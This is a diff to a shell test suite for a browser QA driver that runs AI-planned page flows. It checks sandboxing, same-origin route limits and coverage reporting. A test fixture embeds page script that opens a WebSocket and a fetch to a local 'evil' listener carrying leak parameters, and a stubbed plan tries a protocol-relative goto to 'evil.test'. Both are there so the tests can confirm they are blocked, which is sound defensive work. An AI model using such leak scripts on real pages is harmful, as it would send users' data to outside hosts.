@@ -52,6 +52,41 @@ ck "the driver accepts only plain steps on the app's own paths, and refuses the 
    '[ "$(jq ".valid | length" <<<"$chk")" = 1 ] && [ "$(jq -r ".valid[0].title" <<<"$chk")" = fine ] && [ "$(jq ".errors | length" <<<"$chk")" = 6 ]'
 ck "  a flow that expects nothing is refused as proving nothing" 'jq -r ".errors[]" <<<"$chk" | grep -q "proves nothing"'
 
+# ---- round 5 H2: the page under check cannot open a WebSocket to another address, and the browser keeps its own sandbox ----------------------
+ck "H2 the driver closes every WebSocket that is not to the app's own address, and launches Chromium with its renderer sandbox on" 'grep -q "routeWebSocket" "$REAL/bin/browse.mjs" && grep -q "chromiumSandbox: true" "$REAL/bin/browse.mjs"'
+if st_have_browser; then
+  WSP=$(python3 -c 'import socket; s=socket.socket(); s.bind(("127.0.0.1",0)); print(s.getsockname()[1]); s.close()')
+  WSE=$(python3 -c 'import socket; s=socket.socket(); s.bind(("127.0.0.1",0)); print(s.getsockname()[1]); s.close()')
+  cat > "$T/wssrv.py" <<'PY'
+import http.server, socketserver, sys, threading, socket
+APP, EVIL, LOG = int(sys.argv[1]), int(sys.argv[2]), sys.argv[3]
+page = f"""<html><body><h1>hello app</h1><script>
+try{{new WebSocket('ws://127.0.0.1:{EVIL}/ws-leak?d=DECOY')}}catch(e){{}}
+try{{fetch('http://127.0.0.1:{EVIL}/fetch-leak?d=DECOY')}}catch(e){{}}
+</script></body></html>"""
+class H(http.server.BaseHTTPRequestHandler):
+    def do_GET(s):
+        s.send_response(200); s.send_header("content-type", "text/html"); s.end_headers(); s.wfile.write(page.encode())
+    def log_message(*a): pass
+def evil():
+    ls = socket.socket(); ls.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1); ls.bind(("127.0.0.1", EVIL)); ls.listen(5)
+    while True:
+        c, _ = ls.accept(); d = c.recv(2000).split(b"\r\n")[0]; open(LOG, "ab").write(d + b"\n"); c.close()
+threading.Thread(target=evil, daemon=True).start()
+socketserver.TCPServer(("127.0.0.1", APP), H).serve_forever()
+PY
+  : > "$T/ws-evil.log"; python3 "$T/wssrv.py" "$WSP" "$WSE" "$T/ws-evil.log" & WSPID=$!; sleep 1
+  printf '{"base":"http://127.0.0.1:%s","flows":[{"title":"t","steps":[{"op":"goto","path":"/"},{"op":"wait","ms":2500},{"op":"expect_text","text":"hello"}]}]}' "$WSP" > "$T/wsplan.json"
+  wsout=$(node "$T/bin/browse.mjs" run "$T/wsplan.json" "$T/wsout" 2>&1)
+  kill "$WSPID" 2>/dev/null; wait "$WSPID" 2>/dev/null
+  ck "H2 a page that opens a WebSocket and a fetch to another address reaches neither, and the flow still runs" '[ ! -s "$T/ws-evil.log" ] && jq -e ".flows[0].ok == true" <<<"$wsout" >/dev/null'
+else
+  st_skip "H2 live WebSocket check (no playwright or no browser on this machine)"
+fi
+
+# route choice is a pure function: no browser needed
+ck "bin/routes.py derives same-origin routes (router files, sitemap, home links, diff), caps them, and drops external, dynamic and api ones" 'python3 "$REAL/bin/routes.py" | grep -q "routes.py: ok"'
+
 # The first screen is looked at before any seat is asked, so every check from here on needs a browser.
 if st_have_browser; then
 # ---- unparseable replies write nothing ----------------------------------------------------------------------
@@ -88,6 +123,14 @@ if st_have_browser; then
   ck "--apply on a passing run records PASSED" '[ "$(last_verdict)" = PASSED ]'
   ck "  and writes the findings document, and only that" '[ -f "$T/workspace/tp-pilot-pr1.md" ] && grep -q "PASSED" "$T/workspace/tp-pilot-pr1.md"'
   ck "  and still writes nothing to GitHub" 'no_gh_writes'
+  ck "  the report lists routes covered and not covered" 'grep -q "^Routes covered: /\. Not covered: none\.$" "$T/workspace/tp-pilot-pr1.md"'
+  OFF='PLAN_JSON: [{"title":"Wanders off the list","touches":["index.html"],"steps":[{"op":"goto","path":"/not-on-the-list"},{"op":"expect_text","text":"x"}]}]
+ADR: searched none
+RESULT: PLAN 1 flow(s)'
+  st_noreplies; st_reply default "$OFF"
+  st_duty pilot --pr 1
+  ck "a flow that opens a path outside the route list is refused, and with nothing left the run is an ERROR" '[ "$(last_verdict)" = ERROR ] && grep -q "not on the route list" <<<"$(last_detail)"'
+  st_noreplies; st_reply default "$GOOD"
   # ---- a failing run ---------------------------------------------------------------------------------------
   st_noreplies; st_reply 'You are the stormhand' "$BAD"; st_reply default "$GOOD"
   st_duty pilot --pr 1 --apply
@@ -159,6 +202,47 @@ RESULT: PLAN 1 flow(s)'
 else
   st_skip "no playwright or no browser on this machine: the BLOCKED-app checks did not run"
 fi
+# ---- route list and coverage, with a stand-in driver so no browser is needed ----------------------------------------------------
+# The stand-in answers like bin/browse.mjs: shoot -> a clean first screen, check -> every flow valid, run -> every flow ok (a title with FAIL fails at step 2).
+cat > "$T/fakebrowse.mjs" <<'JS'
+import fs from "node:fs";
+const [mode, file] = process.argv.slice(2);
+if (mode === "shoot") console.log(JSON.stringify({ shots: [] }));
+else {
+  const p = JSON.parse(fs.readFileSync(file, "utf8"));
+  if (mode === "check") console.log(JSON.stringify({ valid: p.flows, errors: [] }));
+  else console.log(JSON.stringify({ flows: p.flows.map(f => /FAIL/.test(f.title) ? { ...f, ok: false, failed_step: 1, message: "stand-in failure", screenshot: "" } : { ...f, ok: true }) }));
+}
+JS
+git -C "$T/work" checkout -q main
+PR_TITLE="Pages" st_pr 3 feat-pages app/page.tsx x app/settings/page.tsx x app/billing/page.tsx x app/users/\[id\]/page.tsx x app/api/pay/route.ts x
+export QUARTERDECK_BROWSE="$T/fakebrowse.mjs"
+FLOW() { printf '{"title":"%s","touches":["app/settings/page.tsx"],"steps":[{"op":"goto","path":"%s"},{"op":"goto","path":"%s"},{"op":"expect_text","text":"x"}]}' "$1" "$2" "$3"; }
+st_noreplies; st_reply default "PLAN_JSON: [$(FLOW "settings looks right" /settings /)]
+ADR: searched none
+RESULT: PLAN 1 flow(s)"
+st_duty pilot --pr 3 --apply
+ck "the crew is shown the route list: the routes the pull request touches come from the router files" 'grep -q "Routes you may open" "$T/claude-calls" && grep -q "/settings.n" "$T/claude-calls" && grep -q "/billing" "$T/claude-calls"'
+ck "  the report says which routes were covered and which were not" 'grep -q "^Routes covered: /, /settings\. Not covered: /billing\.$" "$T/workspace/tp-pilot-pr3.md"'
+ck "  and the recorded run carries the same sentence" 'grep -q "Not covered: /billing" <<<"$(last_detail)"'
+st_noreplies; st_reply default "PLAN_JSON: [$(FLOW "FAIL on home" / /billing)]
+ADR: searched none
+RESULT: PLAN 1 flow(s)"
+st_duty pilot --pr 3 --apply
+ck "a failed flow covers only the steps that ran: the goto after the failed step does not count" 'grep -q "^Routes covered: /\. Not covered: .*/billing" "$T/workspace/tp-pilot-pr3.md"'
+st_noreplies; st_reply default "PLAN_JSON: [$(FLOW "wanders" /settings //evil.test/x)]
+ADR: searched none
+RESULT: PLAN 1 flow(s)"
+st_duty pilot --pr 3 --apply
+ck "a goto to a path off the list is refused (here a protocol-relative address), and nothing is written" '[ "$(last_verdict)" = ERROR ] && ! grep -q "evil" "$T/workspace/tp-pilot-pr3.md" 2>/dev/null'
+st_noreplies; st_reply default "PLAN_JSON: [$(FLOW "settings" /settings /)]
+ADR: searched none
+RESULT: PLAN 1 flow(s)"
+QUARTERDECK_QA_ROUTES=1 st_duty pilot --pr 3 --apply
+ck "QUARTERDECK_QA_ROUTES caps the list: with 1, only / may be opened, so a flow to /settings is refused" '[ "$(last_verdict)" = ERROR ] && grep -q "not on the route list" <<<"$(last_detail)"'
+unset QUARTERDECK_BROWSE
+git -C "$T/work" checkout -q main
+
 for qe in '{"A-B":"x"}' '{"QUARTERDECK_X":"x"}' '{"PATH":"/tmp"}' '{"HOME":"/tmp"}' '{"K":{"nested":1}}' '["a"]'; do
   st_registry '["pilot"]' "$(jq -nc --argjson e "$qe" '{qa:{start:"true", env:$e}}')"
   st_noreplies; : > "$T/claude-calls"; st_duty pilot --pr 1
